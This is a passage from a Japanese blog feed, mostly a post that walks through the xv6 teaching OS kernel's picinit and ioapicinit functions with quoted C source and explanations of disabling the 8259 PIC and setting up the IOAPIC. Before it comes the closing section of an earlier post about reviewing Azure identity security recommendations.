&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;ちょっとAzureを触りたくなったのでまず手始めに&lt;code class=&quot;language-text&quot;&gt;Secure Score for Identity&lt;/code&gt;に表示されている推奨事項を一通り確認してみました。&lt;/p&gt;
&lt;p&gt;これで最低限アカウント関連のベストプラクティスは実施できたかと思うので、これから色々遊んでみようと思います。&lt;/p&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -IOAPIC 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-009-kernel-main-06</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-009-kernel-main-06</guid><pubDate>Sun, 06 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-008-kernel-main-05&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で実行される&lt;code class=&quot;language-text&quot;&gt;seginit&lt;/code&gt;関数を確認しました。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;picinit&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;ioapicinit&lt;/code&gt;関数の挙動を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#picinit%E9%96%A2%E6%95%B0&quot;&gt;picinit関数&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#ioapicinit%E9%96%A2%E6%95%B0&quot;&gt;ioapicinit関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%9E%E3%83%83%E3%83%97%E3%81%95%E3%82%8C%E3%81%9Fioapic%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E9%A0%98%E5%9F%9F%E3%81%AE%E5%8F%82%E7%85%A7&quot;&gt;メモリマップされたIOAPICレジスタ領域の参照&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#data%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E7%B5%8C%E7%94%B1%E3%81%A7%E3%83%87%E3%83%BC%E3%82%BF%E3%81%AE%E8%AA%AD%E3%81%BF%E6%9B%B8%E3%81%8D%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;Dataレジスタ経由でデータの読み書きを行う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#redirection-table%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96&quot;&gt;Redirection Tableの初期化&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;picinit関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#picinit%E9%96%A2%E6%95%B0&quot; aria-label=&quot;picinit関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;picinit関数&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;picinit&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;picirq.c&lt;/code&gt;で定義された関数です。&lt;/p&gt;
&lt;p&gt;以下の通りかなり小さい関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;types.h&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;x86.h&quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;traps.h&quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// I/O Addresses of the two programmable interrupt controllers&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IO_PIC1&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x20&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Master (IRQs 0-7)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IO_PIC2&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0xA0&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Slave (IRQs 8-15)&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;// Don&apos;t use the 8259A interrupt controllers.  Xv6 assumes SMP hardware.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;picinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// mask all interrupts&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;IO_PIC1&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;IO_PIC2&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token comment&quot;&gt;//PAGEBREAK!&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// Blank page.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;outb&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;x86.h&lt;/code&gt;で定義された以下の関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;outb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ushort port&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; uchar data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;asm&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;out %0,%1&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;a&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;d&quot;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;port&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;任意のポートにデータを送信するアセンブリを発行します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/8365746/what-does-outb-in-att-asm-mean&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;assembly - what does “outb” in AT&amp;#x26;T asm mean? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここでは、&lt;code class=&quot;language-text&quot;&gt;0x21&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;0xA1&lt;/code&gt;という&lt;code class=&quot;language-text&quot;&gt;8259 PIC&lt;/code&gt;に関連したポートをマスクしています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;8259 PIC&lt;/code&gt;は、割込み要求を受け入れ、CPUに送信する割込みコントローラですが、SMPをサポートするxv6OSではAPICによる割込みを実装するため、無効化する必要があります。&lt;/p&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;0x21&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;0xA1&lt;/code&gt;は、どちらも&lt;code class=&quot;language-text&quot;&gt;8259 PIC&lt;/code&gt;のデータポートになります。&lt;/p&gt;
&lt;p&gt;以下のOSDevのWikiにある通り、ローカルAPICとIOAPICによる割込みを実装する場合は、これらのデータポートに&lt;code class=&quot;language-text&quot;&gt;0xFF&lt;/code&gt;を設定して&lt;code class=&quot;language-text&quot;&gt;8259 PIC&lt;/code&gt;を無効化します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://wiki.osdev.org/PIC&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;8259 PIC - OSDev Wiki&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/62329557/i-o-port-addressing&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;assembly - I/O Port Addressing - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ioapicinit関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ioapicinit%E9%96%A2%E6%95%B0&quot; aria-label=&quot;ioapicinit関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ioapicinit関数&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;picinit&lt;/code&gt;関数の処理が完了し、PICが無効化されました。&lt;/p&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;ioapic.c&lt;/code&gt;で定義された&lt;code class=&quot;language-text&quot;&gt;ioapicinit&lt;/code&gt;関数が&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数から呼び出されます。&lt;/p&gt;
&lt;p&gt;この関数では、IOAPICの初期化を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ioapicinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; id&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; maxintr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  ioapic &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ioapic&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;IOAPIC&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  maxintr &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;ioapicread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_VER&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  id &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ioapicread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_ID&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;id &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; ioapicid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;cprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;ioapicinit: id isn&apos;t equal to ioapicid; not a MP\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Mark all interrupts edge-triggered, active high, disabled,&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// and not routed to any CPUs.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;=&lt;/span&gt; maxintr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;ioapicwrite&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_TABLE&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; INT_DISABLED &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;T_IRQ0 &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;ioapicwrite&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;REG_TABLE&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;コードを順番に見ていきます。&lt;/p&gt;
&lt;h3 id=&quot;メモリマップされたioapicレジスタ領域の参照&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%9E%E3%83%83%E3%83%97%E3%81%95%E3%82%8C%E3%81%9Fioapic%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E9%A0%98%E5%9F%9F%E3%81%AE%E5%8F%82%E7%85%A7&quot; aria-label=&quot;メモリマップされたioapicレジスタ領域の参照 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;メモリマップされたIOAPICレジスタ領域の参照&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ioapic = (volatile struct ioapic*)IOAPIC;&lt;/code&gt;の行では変数&lt;code class=&quot;language-text&quot;&gt;ioapic&lt;/code&gt;に&lt;code class=&quot;language-text&quot;&gt;ioapic&lt;/code&gt;構造体を設定しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;IOAPIC&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;0xFEC00000&lt;/code&gt;として&lt;code class=&quot;language-text&quot;&gt;ioapic.c&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// ioapic.c&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;IOAPIC&lt;/span&gt;  &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0xFEC00000&lt;/span&gt;   &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Default physical address of IO APIC&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;IOAPICのアドレスはデフォルトで&lt;code class=&quot;language-text&quot;&gt;0xFEC00000&lt;/code&gt;になることが保証されているため、このアドレスを固定値として指定しています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/24828186/about-the-io-apic-82093aa&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;x86 - About the IO-APIC 82093AA - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ioapic&lt;/code&gt;構造体は、以下のように非常にシンプルな構造になっています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// IO APIC MMIO structure: write reg, then read or write data.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ioapic&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint reg&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint pad&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint data&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://web.archive.org/web/20161130153145/http://download.intel.com/design/chipsets/datashts/29056601.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Memory Mapped Registers for Accessing IOAPIC Registers&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
